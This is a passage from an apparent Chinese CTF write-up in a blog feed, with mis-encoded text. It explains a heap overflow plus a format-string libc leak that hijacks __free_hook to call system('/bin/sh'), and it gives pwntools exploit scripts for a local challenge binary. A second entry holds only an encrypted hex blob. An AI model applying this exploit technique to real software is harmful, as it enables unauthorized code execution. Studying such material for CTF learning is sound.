æ­¤è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¾“å…¥çš„å€¼çš„ç¬¬ä¸€ç¬¬ä¸‰å­—èŠ‚æ¥ç»•è¿‡æ£€æŸ¥ã€‚</p><p><img src="/../img/2706180-20220514181144499-886432126.png"></p><p><img src="/../img/2706180-20220514180303512-502508280.png" alt="image-20220513215318327"></p><p><img src="/../img/2706180-20220514181203734-401889871.png"></p><p><img src="/../img/2706180-20220514180303249-943265363.png" alt="image-20220513215355579"></p><p>é€šè¿‡è§‚å¯Ÿï¼Œå‘ç°äº†è¿™ä¸‰ä¸ªæ ¸å¿ƒå‡½æ•°ï¼Œè¿›å…¥ä»–ä»¬çš„æ¡ä»¶å°±æ˜¯æ§åˆ¶ç¬¬å››å­—èŠ‚çš„å€¼å³å¯ã€‚</p><h2 id="å¤§è‡´æ€è·¯"><a href="#å¤§è‡´æ€è·¯" class="headerlink" title="å¤§è‡´æ€è·¯:"></a>å¤§è‡´æ€è·¯:</h2><p>freeå‡½æ•°æ‰§è¡ŒåæŠŠæŒ‡é’ˆç»™ç½®ç©ºäº†ï¼Œè¿™é‡Œæ— æ³•åˆ©ç”¨ï¼Œé‚£åªèƒ½å»è§‚å¯Ÿmemcpyå‡½æ•°äº†ã€‚è§‚å¯Ÿmemcpyå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå‘ç°å®ƒå’Œmallocè¿”å›çš„åœ°å€æ˜¯ä¸€æ ·çš„ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å¾€&amp;unk_2020E0+64(__int64)a1.three_byteè¿™ä¸ªåœ°å€å†™å…¥æ•°æ®ï¼Œç„¶åå¤åˆ¶ç»™mallocä¸­ï¼Œå¯ä»¥å¤åˆ¶0x40ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚</p><p>äºæ˜¯æ€è·¯å°±æ˜¯åˆ©ç”¨æº¢å‡ºä¿®æ”¹å½“å‰chunkçš„ä¸‹ä¸€ä¸ªchunk(éœ€è¦è¢«freeæ‰ï¼‰çš„fdæŒ‡é’ˆï¼Œç„¶åæˆ‘ä»¬å†æ‰§è¡Œmallocæ—¶ï¼Œæ˜¯å¯ä»¥ç”³è¯·å›æ¥ä¸€ä¸ªæŒ‡å®šçš„åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹__free_hookï¼ˆfreeå‡½æ•°æ‰§è¡Œä¹‹å‰ï¼Œä¼šæ£€æŸ¥__free_hookï¼Œå¦‚æœå…¶å€¼ä¸ºNULLï¼Œåˆ™è°ƒç”¨_int_freeå‡½æ•°ï¼Œå¦åˆ™è°ƒç”¨__free_hookæ‰€æŒ‡å‘çš„å€¼ï¼‰</p><p>ç”³è¯·å›æ¥ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨memcpyæŠŠsystemåœ°å€å†™å…¥__free_hookæ‰€æŒ‡å‘çš„åœ°æ–¹ã€‚æœ€åå†æŠŠä¸€ä¸ªå †å—é‡Œå­˜å…¥&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ï¼Œfreeæ‰è¿™ä¸ªå †å—å³å¯è·å–shellã€‚</p><h2 id="è°ƒè¯•æ¥æ„å»ºexp"><a href="#è°ƒè¯•æ¥æ„å»ºexp" class="headerlink" title="è°ƒè¯•æ¥æ„å»ºexp"></a>è°ƒè¯•æ¥æ„å»ºexp</h2><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆå°è¯•å»ç»•è¿‡ä¸‹é¢è¿™ä¸ªifæ£€æŸ¥ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œä¸€ä¸‹mallocå‡½æ•°ï¼Œå…¶ä»–çš„æš‚æ—¶å…ˆéšä¾¿è¾“å…¥å³å¯ã€‚</p><p><img src="/../img/2706180-20220514181218429-18861707.png"></p><p><img src="/../img/2706180-20220514180302997-106339106.png" alt="image-20220514090631642"></p><p>è§‚å¯Ÿä¸Šé¢æ‰§è¡Œmallocçš„æƒ…å†µï¼Œè¿™ä¸ªè¦æ±‚æˆ‘ä»¬çš„æœ€é«˜å­—èŠ‚æ˜¯10ï¼Œæ‰èƒ½æ‰§è¡Œmallocï¼Œç„¶åç¬¬ä¸‰å­—èŠ‚å†³å®šäº†mallocçš„å¤§å°ï¼ˆtwo_byteæ˜¯ä»ä½å­—èŠ‚æ•°çš„ï¼Œç¬¬ä¸‰å­—èŠ‚æ˜¯ä»é«˜å­—èŠ‚æ•°çš„ï¼‰ï¼Œç„¶åè¿™ä¸ªæŠŠmallocè¿™ä¸ªåœ°å€è®°å½•åœ¨a1.one_byteåç§»è¿™é‡Œã€‚</p><p>æˆ‘ä»¬æš‚å®šç”³è¯·0x10å¤§å°çš„chunkï¼Œç„¶åå°†one_byteè®¾ç½®æˆ0ï¼Œé‚£ç›®å‰çš„expåº”è¯¥ä¸ºä¸‹é¢è¿™ä¸ªï¼Ÿ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xec6)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;10001000&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">             </span><br></pre></td></tr></table></figure><p>å¯æ˜¯è¿è¡Œä¸€ä¸‹å‘ç°ï¼Œifçš„æ£€æŸ¥æ²¡æœ‰è¿‡å»ï¼Œå‡ºç°äº†æ­»å¾ªç¯ã€‚æŠŠç¬¬å››è¡Œæ³¨é‡Šå–æ¶ˆè°ƒè¯•ä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220514181236179-1811812982.png"></p><p>å‘ç°æ­¤æ—¶æ¥åˆ°äº†ifåˆ¤æ–­çš„åœ°æ–¹ï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹$rbp-0x24çš„å€¼ï¼Œå‘ç°æœ«å°¾çš„æ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Ÿ989A68ï¼Ÿ è¿™ä¸ªè‚¯å®šæ˜¯è¿‡ä¸äº†åˆ¤æ–­çš„ã€‚å›æƒ³èµ·ç°åœ¨çœ‹çš„æ˜¯ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—ï¼Œæˆ‘ä»¬ç”¨è®¡ç®—å™¨è½¬ä¸€ä¸‹åè¿›åˆ¶çœ‹çœ‹ã€‚</p><p><img src="/../img/2706180-20220514181247254-599152087.png"></p><p>è±ç„¶å¼€æœ—ï¼Œ<strong>å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ˜¯åè¿›åˆ¶ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯æœ€åå®æ¥å–æŸä¸ªå­—èŠ‚è¿›è¡Œåˆ¤æ–­çš„æ—¶å€™ï¼Œæ˜¯å¯¹åå…­è¿›åˆ¶çš„æ•°æ®è¿›è¡Œæ“ä½œçš„</strong>ã€‚å› æ­¤ä¸ºäº†ç»•è¿‡åˆ¤æ–­ï¼Œæˆ‘ä»¬è¦ç”¨åå…­è¿›åˆ¶çš„æ•°æ®ç»•è¿‡ï¼Œç„¶åæŠŠå…¶è½¬æ¢æˆåè¿›åˆ¶çš„æ•°æ®è¾“å…¥ã€‚å› æ­¤æˆ‘ä»¬åº”è¯¥æŠŠ10001000è¿™ä¸ªå€¼æ”¹æˆa001000ï¼ˆaä»£è¡¨ç¬¬å››å­—èŠ‚ï¼ˆæˆ‘ä»ä½åœ°å€å¼€å§‹æ•°çš„ï¼‰è®¾ç½®æˆ10ä¸ºäº†æ‰§è¡Œmallocï¼Œç¬¬ä¸‰å­—èŠ‚çš„00ï¼Œæ— æ‰€è°“åªè¦èƒ½ç»•è¿‡æœ€å¼€å§‹çš„æ£€æŸ¥å³å¯ï¼Œç¬¬äºŒå­—èŠ‚çš„10ä»£è¡¨çš„æ˜¯mallocç”³è¯·chunkçš„å¤§å°ï¼Œç¬¬ä¸€å­—èŠ‚çš„00ç›¸å½“äºæ˜¯unk_202060çš„ç´¢å¼•ï¼Œç”¨æ¥æ‰¾åˆ°ä¸åŒçš„å †å—ï¼‰ï¼Œç„¶åè½¬æ¢æˆåè¿›åˆ¶è¾“å…¥ã€‚</p><p>æ‰€ä»¥æœ€åçš„å‘é€åº”è¯¥æ˜¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç›®å‰æˆ‘ä»¬å·²ç»æŒæ¡äº†ç»•è¿‡ifçš„æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒè¯•æ¥å¸ƒå±€äº†ã€‚é¦–å…ˆæˆ‘ä»¬è¦æº¢å‡ºï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬è‚¯å®šæ˜¯è¦ç”³è¯·ä¸¤ä¸ªå †å—ï¼Œç„¶åfreeæ‰åç”³è¯·çš„é‚£ä¸ªå †å—ï¼Œå»æ‰§è¡Œmemcpyæ¥ä¿®æ”¹freeæ‰å †å—çš„fdæŒ‡é’ˆï¼Œå†mallocå›æ¥ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œmemcpyå¤åˆ¶çš„å†…å®¹æ˜¯åœ¨è¿™é‡Œè¾“å…¥çš„ï¼Œæˆ‘ä»¬åº”è¯¥æå‰åœ¨è¿™é‡Œå¸ƒå±€ä¸€ä¸‹ã€‚</p><p><img src="/../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p><h3 id="sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>sprintfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h3><p>æˆ‘ä»¬è¦å°†fdæŒ‡é’ˆä¿®æ”¹ä¸º__free_hookçš„åœ°å€ï¼Œè·å–è¿™ä¸ªåœ°å€çš„å‰ææ˜¯æ‹¿åˆ°libcåŸºåœ°å€ã€‚æ­¤æ—¶å°±è¦ç”¨åˆ°å‰é¢çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´äº†ï¼Œå…ˆçœ‹ä¸€ä¸‹sprintfå‡½æ•°çš„æ‰§è¡Œæƒ…å†µã€‚</p><p><img src="/../img/2706180-20220514180302267-1280701485.png" alt="image-20220514101654530"></p><p>å‘ç°åç§»15çš„åœ°æ–¹å­˜åœ¨__libc_start_mainå‡½æ•°åœ°å€ã€‚ä¸è¿‡ç”±äºè¿™æ˜¯sprintfå‡½æ•°ï¼Œå®ƒçš„å‚æ•°formatå­˜åœ¨rsiå¯„å­˜å™¨ä¸Šï¼Œrdiå·²ç»è¢«ç¬¬ä¸€ä¸ªå‚æ•°å äº†ï¼Œå†å¡«æ•°æ®æ—¶æ˜¯ä»rsiå¼€å§‹ï¼Œè·³è¿‡äº†rdiå¯„å­˜å™¨ã€‚å› æ­¤æ˜¯20ï¼ˆ15+5ï¼‰</p><p>æ­¤å¤„æ¥æ”¶libcåŸºåœ°å€çš„payloadä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span><span class="comment">#0x21c87æ˜¯æ³„éœ²çš„åœ°å€ä¸libcåŸºåœ°å€çš„åç§»</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è·å–__free_hookçš„åœ°å€äº†ï¼Œæˆ‘ä»¬å°†å…¶å¸ƒç½®åœ¨è¿™ä¸ªåœ°æ–¹</p><p><img src="/../img/2706180-20220514180301736-97569248.png" alt="image-20220514100958393"></p><p>æ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨æº¢å‡ºå°†freeæ‰çš„chunkçš„fdæŒ‡é’ˆæ”¹æˆäº†__free_hookçš„åœ°å€ï¼ŒåŒæ—¶å¯ä»¥çœ‹è§binsä¸­å·²ç»å‡ºç°äº†__free_hookçš„åœ°å€ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="/../img/2706180-20220514182802712-1937798255.png"></p><p>æ­¤æ—¶çš„payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(free_hook)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åªéœ€è¦ä¸¤æ¬¡mallocï¼Œå°±å¯ä»¥ç”³è¯·åˆ°ä¸€ä¸ªä½ç½®åœ¨__free_hookåœ°å€ä¸Šçš„å †å—ã€‚</p><p>æ¥ç€æˆ‘ä»¬ç”¨memcpyå‡½æ•°æŠŠsystemçš„åœ°å€å†™åœ¨__free_hookå †å—é‡Œï¼ˆæ•ˆæœå¦‚ä¸‹ï¼‰ï¼Œæ­¤æ—¶__free_hookæŒ‡å‘çš„å°±æ˜¯systemäº†ã€‚</p><p><img src="/../img/2706180-20220514181316800-65373104.png"></p><p><img src="/../img/2706180-20220514180301381-730330410.png" alt="image-20220514154108694"></p><p>æœ€åæˆ‘ä»¬è¦freeæ‰ä¸€ä¸ªchunkï¼Œè¿™ä¸ªchunké‡Œé¢è£…çš„éƒ½æœ‰ä»€ä¹ˆä¸é‡è¦ï¼Œåªéœ€è¦è®©è¿™ä¸ªchunkçš„åœ°å€å»æŒ‡å‘&#x2F;bin&#x2F;shè¿™ä¸ªå­—ç¬¦ä¸²å³å¯ï¼ˆæ˜¯æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œè€Œéå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå› ä¸ºsysteméœ€è¦çš„æ˜¯ä¸€ä¸ªæŒ‡å‘&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œchunkçš„åœ°å€å·²ç»æ˜¯ä¸€ä¸ªæŒ‡é’ˆäº†ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦å†ä¼ ä¸€ä¸ªæŒ‡é’ˆï¼Œåªéœ€è¦å†™å…¥å­—ç¬¦ä¸²&#x2F;bin&#x2F;shå³å¯ï¼‰</p><p><img src="/../img/2706180-20220514180300891-657482779.png" alt="image-20220514155318872"></p><p>æœ€åæ‰§è¡Œfreeå³å¯è·å–shellã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0xec6)\nc&#x27;</span>)<span class="comment">#ec6</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">fake_chunk1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_hook)</span><br><span class="line">fake_chunk2=p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.send(fake_chunk1)</span><br><span class="line">p.send(fake_chunk2)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;167776256&#x27;</span>)<span class="comment">#malloc(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326593&#x27;</span>)<span class="comment">#free(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184549376&#x27;</span>)<span class="comment">#memcpy(0)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776257&#x27;</span>)<span class="comment">#malloc(1)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;167776258&#x27;</span>)<span class="comment">#malloc(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;184614914&#x27;</span>)<span class="comment">#memcpy(2)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;201326592&#x27;</span>)<span class="comment">#free(0)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> å †æº¢å‡º </tag>
            
            <tag> åŠ«æŒfree_hook </tag>
            
            <tag> idaæ–°å»ºç»“æ„ä½“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¨‹åºå®ç°å•é“¾è¡¨ä¸Šçš„ä¸€ä¸ªæ¼æ´</title>
      <link href="/posts/378831b9.html"/>
      <url>/posts/378831b9.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="64ad29b965289bd93383cf12d930b5616d483fe18bdd79fa0110cd0369df2de9">0e96a196e04ab582d32680aaeaf05fdcdf197277fa4468e51c98a6189f8f162162cc8cda35bb8442d3ced35bab02c59a0869a8472f83cec4d4675d54a25b767b0483f19c3dea62baafd7f856007691638970fa7e481f5875f765f81d977b55ca3ba737f24e6996e190bc521ef6d4085efb86125f0f5a4294bcc01b231e7e322002abb294aa592404ad1c1eca241f4c878f9b6e1ab280ef16140f812d4c76cab61d8cd44afd45e90cee026e159642469aeac7b03146c77c1f103270b97f7043a5c0339d106e7ce0591bb39d20d8edf768dfc50ae9ba9102f19ae8ca3ca4668d7ee5b38df036432e4d52b23a0bdbdb65ba40b08912f936ebfc789ac487e9096b666ad306189fb7698dcd90ae0adf29d2bffe8394591a6e196022c019878b6cd7e1777aa10b1bb67bba0cb1c1549ee8903862531357e54b77afb2f0a45bdf84437421a75f9c2c81321936403737e4fe78ca9d47a705208db71e06805dcf4c40f133f230a9f4e6088abf3cb14b9a1f13006e5b36d428443d0cd864243d6ab32dcdf922cbb3c61f4a2c133165c9b68610280faa86cf66ba3ebb615697c8bf599694355ca3cce0f2f5778041f8b9cb9545e07018e5e2c65024a9a7a5f4d015447eccd55055f853a6f4e424f3899a28ea3e2afdd5aa3bbab3e83af93a259297fcfa033f9eec4a0c80744d96d9078c6a3c5ba79cf98a265bc35e44ac2db2c3857adb395a7d9aaaef025c2205024414b221887105f9a6e7659ff67992a96abb7d3701af1e9bb9ea956f836c9ead5f84ee3a15701656f8ac4542407becd284daaebde72716c0a7988fe1c48e30546acea5030fd47f18df00a856f516dee1e905b40f4ed7988beeffeb63b6c079f436a83c7b28c752a844d4ad38ad2db2b1dd7b492f43e2f1b28382529cbc631b4a565587a3eda7fdd385728201a95f93ba96b8be62ea1bd7c052c86d8481deaedde83090267036e8adbf84a9087f732ce6e62f360fc42502c1930ded848649ff1a8d5c30e972e1002f1e8ffb038e380829a6400b6bd28d89557baec19c3d42652f79e8731e1406476adbcba5510305816a47e3bcbac938f7e679f09320b6820d4bac4bce1db3d17a93e8443ea72afb4d82dd42bf336559888936357d88c3663f283e6c8569eaa87d2a8a71786913150db9b07c06bedd9a467d158e05c0008044fc2fc8ca1fae3ef00caef6eaf735d85396c9448b063a1f99cf56e20257d60c4ca806bd84465f98a897790c2dbf57a8d8e483cf1e2a58fc88418dd3625cc91b23403aaaa25c8f9bc7e94ad65cde149cda1bd23ad0c57e138aaedbea15d9afcdb5dd63a6d4ff146bdcdbe2f9fa7af64247e2e8df479ad21904fd476ad6c8990e6085985612a15a610934d221ddb824ea46244f2a61a86e1748613ac7ded604c2a01ff11cd1ecb2d49f719647d215818f51249aa89138ea6b8b0146390e44a603ceb3ef57630a1e0247ee43ff2af05bbf33cca5577616e5b6e84a9c5bca79a0b91ddbeb9b7716f2f41516bb9b6924004d828eca3c8e97180e1188132da0f0b5f8985ef7e0eae114651398d2a6a4866cc39c0c48ee3cfdcc18b0b19e2f9f754bff5ff82992e28912f279bad07a2cf4d3321c3383402f4a02c08872a15418a076803da35a508a928746bdc75409d46094dc3bc023b69c5c9911b6d4ecca0e28d83116337607216a0eda2866629d84f49770a5444b0f01cd7cc5c898a685fb10b09416ee38cc9763f7ea3c51ea7a60647381df85b294b3dbd7b4c5b43f1ce28222cbccc8ca0029ba4f69609e0cee59cf229c4455d3d5aecf2938905ca29e7253011a306595fcc22e044a99d3e2571622af160b7970d7e53a6193ba71f4ac26208f359357d9cf263184d4ba9a38b793fd23a2107afee1425000ee5219a9ae308078b088c3bedf021a978805ff030f65e625ee249b9173e017c999bb38ded9d9405ae3ae58a84e401dde719a43f9b0af7d58c0483183163e4aadb23ccf381eaf0ffbfc2af339691ab3889d4943a8e9a8a5c64178c3e0bbfce0e990257009e6a6c6b82cd2ed8eefac46b306529b06bf946bfec28defd0f7c6315bc48565715c1b96e280b9eedc0f0a58e24894f698b682815280f53e76de2068bcfb4a9dcfec1f0ca5dad4137fb4769823e6ed80efa5df9fd0202c434f5f98d249b079c2841cf58e280a3e8ece97b6089c1efb2b62015de7f85b7a1190af402001109f42f416f18cd755278ed895cb63068042e5ec31fb4fe3779a382e5a52229ee1a1f74dcd179da11761fe717eaea45be219eeea945d340056fb6cccb312621c0f0437beb6592b464d4897180e8544af99852b40482fbcb432fab9c4bd6a7e465a62320e196c34242a2a935d0a6d93d87262fbfe376c28e79d4ae94fa3c419e12383328e263c361fd652883ff211df6c89ed9bc495c7efadf9ba94cba1cc0c5e9fea9fdce344d7d3fadced61d5fd5554d3aece46ddaee31b110e6c765a47da00be9c3766e42c10f78007eb0c8d0c5d4f5dd9b1a01fb57b886314ca83a61955d23bf4f322d5befd6f50742c2fbfc51c8364307b3af8f0635f132090952f39064de10ffec0875ea8ff5ae0be104c4f81fc721d537e4fa0daddc365ef12f0559c954f8019a2bdfcc0a6636420529ea0ce72b906cb21103073c8c41a545b658969660c26116d793d6c4423b150d97dffb2af6013ab30389af6dae8a4362077c7b45a60e02fe117286c0f519ddf106032d07852990d8ad13b9b64766545ceaa9d39428ddf742ce09c13662169ca977b1c8121ff6646aca29db55c60d38de812d6c9b57160da1ef8044d6b52dcecc64bb7d3f4305a1563d25962bdd7c8624a0db652b6670b7010459a22d107b4c5ac64e720f7b0c3f048fa432b5ff324dfefca86ab8f520c26fc2977928f6986fb2484551a0f0e92ea7dabbf9d9d291b166eb46f6fa6a0243bdd5f4d53a839af89659ace0f0528692e726b40c11f9932286591dbbae2c7d0f34d7ef52041efa39d140ed6da8238c2948e3f30153b9db9bb4fb2de1df2b0b28d73493fe7a7e0b77ba0d2f45cb933c755cecb7c97f3c9646478873a4845e2cefd02db3587dbc8d9268efb27b12fdc210a80c2f3fe097423001a9edbaf589230b714f5b1473fac435c04d5ce10cbf457cad690dcd7a812cc35e9c8378ace4193ec1119061657475ce309fb3788085a1a853bae2ee4e68e2e82685315f460a05b97dff10fd0b793252f8355e8b67435f8485c93ff8daa2b831ddd10a909f50f1f6a9308b76064a3874901b2a549df73cee9afd649d9682c5705f07d6e6fc532ee02f9f460f16c3c500e139fdaf2c0cff27efffdeb1d7baac3de389c5c59cfec6254360c9953cc07d4c023cba4a766cc30a04e2f48e2382a42aa0c381baf481520d4d4bddc252cec8d60c8f047c225e3acd0daf37370b5617cae82e3e8c0904a78f0643aae6abf771ded54763f16829af7405176e4a4203f0eebcb8e31bf47eeedbb048bd90f26d2ff7b2c712ca3eeec665e97c91a39c87b68aec084e5e6a89608821e7b3edded6f8638a76b289709071af03b4069fb89affd3fdd07264cfd0e6f0bbf4a167e9d109e716e91a142f8acb4fa162802597e1914db27751d897a68cb0e31e7e7a3dd459dfcc3399ddd6e7337d1ad7fa8a00a146f72cb172caa38c322d1f91df58f809620230dee4b8d33087e5697668e8d6948c19278878111222965071ff547bc69d83067771ffedad0899254c1a4809800797af93ef9772f1003127dd0294d99188ebfc86cc4862a7403024e0e6a